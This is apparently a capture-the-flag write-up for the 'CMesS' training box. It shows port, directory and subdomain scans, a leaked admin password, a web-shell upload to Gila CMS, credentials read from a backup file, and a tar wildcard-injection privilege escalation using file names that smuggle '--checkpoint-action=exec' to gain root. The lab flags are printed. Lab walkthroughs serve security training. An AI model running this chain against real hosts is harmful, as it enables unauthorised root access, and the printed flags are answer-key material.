CMESS

ENUMERATION
"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/CMESS]
└─$ sudo nmap -p- -sC -sV -A  --min-rate 2500 10.10.121.58 -oN nmap.txt 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-08 03:04 EST
Warning: 10.10.121.58 giving up on port because retransmission cap hit (10).
Stats: 0:01:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.73% done; ETC: 03:05 (0:00:00 remaining)
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.93% done; ETC: 03:05 (0:00:00 remaining)
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.64% done; ETC: 03:05 (0:00:00 remaining)
Nmap scan report for 10.10.121.58
Host is up (0.16s latency).
Not shown: 65529 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
15071/tcp filtered unknown
55046/tcp filtered unknown
60181/tcp filtered unknown
63253/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/8%OT=22%CT=1%CU=39113%PV=Y%DS=2%DC=T%G=Y%TM=62270E66
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)SEQ(
OS:SP=105%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3
OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=6
OS:8DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   176.66 ms 10.11.0.1
2   164.05 ms 10.10.121.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.77 seconds






"""


GOBUSETR
"""



                                                                                                                                                                       
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/CMESS]
└─$ gobuster dir -u http://cmess.thm/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error  -x php,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cmess.thm/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/03/08 03:07:43 Starting gobuster in directory enumeration mode
===============================================================
/001                  (Status: 200) [Size: 4078]
/0001                 (Status: 200) [Size: 4078]
/001.php              (Status: 200) [Size: 4078]
/0001.php             (Status: 200) [Size: 4078]
/001.txt              (Status: 200) [Size: 4078]
/0001.txt             (Status: 200) [Size: 4078]
/01                   (Status: 200) [Size: 4078]
/01.php               (Status: 200) [Size: 4078]
/01.txt               (Status: 200) [Size: 4078]
/.htpasswd            (Status: 403) [Size: 274] 
/.htaccess            (Status: 403) [Size: 274] 
/.htpasswd.php        (Status: 403) [Size: 274] 
/.htaccess.php        (Status: 403) [Size: 274] 
/.htpasswd.txt        (Status: 403) [Size: 274] 
/.htaccess.txt        (Status: 403) [Size: 274] 
/1                    (Status: 200) [Size: 4078]
/1.php                (Status: 200) [Size: 4078]
/1a2b3c               (Status: 200) [Size: 4078]
/1_files              (Status: 200) [Size: 4078]
/1c                   (Status: 200) [Size: 4078]
/1.txt                (Status: 200) [Size: 4078]
/1a2b3c.php           (Status: 200) [Size: 4078]
/1_files.php          (Status: 200) [Size: 4078]
/1c.txt               (Status: 200) [Size: 4078]
/1p2o3i               (Status: 200) [Size: 4078]
/1q2w3e               (Status: 200) [Size: 4078]
/1qaz2wsx             (Status: 200) [Size: 4078]
/1qw23e.txt           (Status: 200) [Size: 4078]
/1x1                  (Status: 200) [Size: 4078]
/1a2b3c.txt           (Status: 200) [Size: 4078]
/1_files.txt          (Status: 200) [Size: 4078]
/1c.php               (Status: 200) [Size: 4078]
/1q2w3e.php           (Status: 200) [Size: 4078]
/1qw23e               (Status: 200) [Size: 4078]
/1x1.php              (Status: 200) [Size: 4078]
/1q2w3e.txt           (Status: 200) [Size: 4078]
/1qw23e.php           (Status: 200) [Size: 4078]
/1x1.txt              (Status: 200) [Size: 4078]
/1sanjose             (Status: 200) [Size: 4078]
/1sanjose.php         (Status: 200) [Size: 4078]
/1p2o3i.php           (Status: 200) [Size: 4078]
/1qaz2wsx.php         (Status: 200) [Size: 4078]
/0                    (Status: 200) [Size: 3851]
/1p2o3i.txt           (Status: 200) [Size: 4078]
/1qaz2wsx.txt         (Status: 200) [Size: 4078]
/1sanjose.txt         (Status: 200) [Size: 4078]
/About                (Status: 200) [Size: 3339]
/Index                (Status: 200) [Size: 3851]
/Search               (Status: 200) [Size: 3851]
/about                (Status: 200) [Size: 3353]
/admin                (Status: 200) [Size: 1580]
/api                  (Status: 200) [Size: 0]   
/assets               (Status: 301) [Size: 318] [--> http://cmess.thm/assets/?url=assets]
/author               (Status: 200) [Size: 3590]                                         
/blog                 (Status: 200) [Size: 3851]                                         
/category             (Status: 200) [Size: 3862]                                         
/cm                   (Status: 500) [Size: 0]                                            
/feed                 (Status: 200) [Size: 735]                                          
/fm                   (Status: 200) [Size: 0]                                            
/index                (Status: 200) [Size: 3851]                                         
/lib                  (Status: 301) [Size: 312] [--> http://cmess.thm/lib/?url=lib]      
/log                  (Status: 301) [Size: 312] [--> http://cmess.thm/log/?url=log]      
/login                (Status: 200) [Size: 1580]                                         
/robots.txt           (Status: 200) [Size: 65]                                           
/robots.txt           (Status: 200) [Size: 65]                                           
/search               (Status: 200) [Size: 3851]                                         
/server-status        (Status: 403) [Size: 274]                                          
/sites                (Status: 301) [Size: 316] [--> http://cmess.thm/sites/?url=sites]  
/src                  (Status: 301) [Size: 312] [--> http://cmess.thm/src/?url=src]      
/tags                 (Status: 200) [Size: 3139]                                         
/tag                  (Status: 200) [Size: 3874]                                         
/themes               (Status: 301) [Size: 318] [--> http://cmess.thm/themes/?url=themes]
/tmp                  (Status: 301) [Size: 312] [--> http://cmess.thm/tmp/?url=tmp]      
                                                                                         
===============================================================
2022/03/08 03:33:44 Finished
===============================================================







"""


ROBOTS.TXT

"""





User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/s





"""

NOTHING AT THE SITE 



SUDOMIN ENUMERATION 

"""
┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/CMESS]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm/ -H "Host: FUZZ.cmess.thm" -fw 522

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31]
[WARN] Caught keyboard interrupt (Ctrl-C)







LETS GO TO http://dev.cmess.thm






"""

http://dev.cmess.thm

"""






andre@cmess.thm

Have you guys fixed the bug that was found on live?
support@cmess.thm

Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!
support@cmess.thm

Update! We have had to delay the patch due to unforeseen circumstances
andre@cmess.thm

That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.
support@cmess.thm

Your password has been reset. Here: KPFTN_f2yxe%





"""

SO WE GOT SOME JUICE HERE


USERNAME = andre@cmess.thm

PASSWORD = KPFTN_f2yxe%



ADMINPANEL 

"""
Gila CMS version 1.10.9 

FOUND ABILITY TO UPLOAD TO ASSETS FOLDER LETS UPLOAD A SHELL




GOT IT AFTER SOME TRICKS 


GOT USER www-data

LETS upgarde shell

python3 -c 'import pty;pty.spawn("/bin/bash");'


LETS PRIV ESC TO ANDRE 

RUN LINPEAS AND LINENUM 



[-] Location and Permissions (if accessible) of .bak file(s):
-rw-r--r-- 1 root root 3020 Feb  6  2020 /etc/apt/sources.bak
-rwxrwxrwx 1 root root 36 Feb  6  2020 /opt/.password.bak



www-data@cmess:/opt$ cat .password.bak 
cat .password.bak
andres backup password
UQfsdCB7aAP6
www-data@cmess:/opt$ su 






"""



ANDARE

"""



andre@cmess:~$ cat user.txt
cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
andre@cmess:~$ 









""" 

PRIV ESC THROUGH CORNTAB WILDCARD 

"""





andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ touch /home/andre/backup/--checkpoint=1
andre@cmess:~$ touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cd backup/
andre@cmess:~/backup$ l
--checkpoint=1  --checkpoint-action=exec=sh shell.sh  note*  shell.sh*
andre@cmess:~/backup$ ls
--checkpoint=1  --checkpoint-action=exec=sh shell.sh  note  shell.sh
andre@cmess:~/backup$ ls -la /tmp
total 836
drwxrwxrwt  9 root     root       4096 Mar  8 02:38 .
drwxr-xr-x 22 root     root       4096 Feb  6  2020 ..
-rw-r--r--  1 root     root        228 Mar  8 02:38 andre_backup.tar.gz
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 .font-unix
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 .ICE-unix
-rwxrwxrwx  1 www-data www-data  46631 Mar  6 07:18 LinEnum.sh
-rwxrwxrwx  1 www-data www-data 763542 Feb 23 06:43 linpeas.sh
drwx------  3 root     root       4096 Mar  8 00:03 systemd-private-fd7dfe0c509c4ea19c602b292a62a687-systemd-timesyncd.service-HiXe9E
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 .Test-unix
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 VMwareDnD
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 .X11-unix
drwxrwxrwt  2 root     root       4096 Mar  8 00:03 .XIM-unix
andre@cmess:~/backup$ ls -la /tmp
total 1852
drwxrwxrwt  9 root     root        4096 Mar  8 02:40 .
drwxr-xr-x 22 root     root        4096 Feb  6  2020 ..
-rw-r--r--  1 root     root         228 Mar  8 02:40 andre_backup.tar.gz
-rwsr-sr-x  1 root     root     1037528 Mar  8 02:40 bash
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 .font-unix
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 .ICE-unix
-rwxrwxrwx  1 www-data www-data   46631 Mar  6 07:18 LinEnum.sh
-rwxrwxrwx  1 www-data www-data  763542 Feb 23 06:43 linpeas.sh
drwx------  3 root     root        4096 Mar  8 00:03 systemd-private-fd7dfe0c509c4ea19c602b292a62a687-systemd-timesyncd.service-HiXe9E
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 .Test-unix
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 VMwareDnD
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 .X11-unix
drwxrwxrwt  2 root     root        4096 Mar  8 00:03 .XIM-unix
andre@cmess:~/backup$ /tmp/bash -p
bash-4.3# id
uid=1000(andre) gid=1000(andre) euid=0(root) egid=0(root) groups=0(root),1000(andre)
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
bash-4.3# 




"""